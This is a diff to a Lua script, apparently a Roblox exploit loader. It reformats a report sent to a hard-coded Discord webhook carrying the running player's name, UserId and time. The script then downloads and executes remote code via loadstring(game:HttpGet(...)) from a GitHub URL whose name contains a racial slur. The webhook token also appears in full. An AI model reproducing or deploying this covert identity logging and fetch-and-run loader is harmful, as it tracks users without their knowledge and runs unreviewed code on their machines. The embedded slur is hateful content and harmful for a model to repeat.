@@ -7,14 +7,32 @@ local webhook_url = "https://discord.com/api/webhooks/1483707171102392421/62Piq-
 
 local playerName = player.Name
 local playerId = player.UserId
-
 local currentTime = os.date("%d/%m/%Y %H:%M:%S")
 
 local data = {
-    ["content"] = "**Script Executed**\n"
-        .. "Player: " .. playerName .. "\n"
-        .. "UserId: " .. playerId .. "\n"
-        .. "Time: " .. currentTime
+    ["embeds"] = {
+        {
+            ["title"] = "Script Executed",
+            ["color"] = 16777215,
+            ["fields"] = {
+                {
+                    ["name"] = "Player",
+                    ["value"] = playerName,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "UserId",
+                    ["value"] = tostring(playerId),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Time",
+                    ["value"] = currentTime,
+                    ["inline"] = false
+                }
+            }
+        }
+    }
 }
 
 local jsonData = HttpService:JSONEncode(data)
@@ -30,8 +48,6 @@ if request then
         },
         Body = jsonData
     })
-else
-    warn("")
 end
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/MaybeNotMandy/ihateniggercuzyes/refs/heads/main/penisflavor"))()
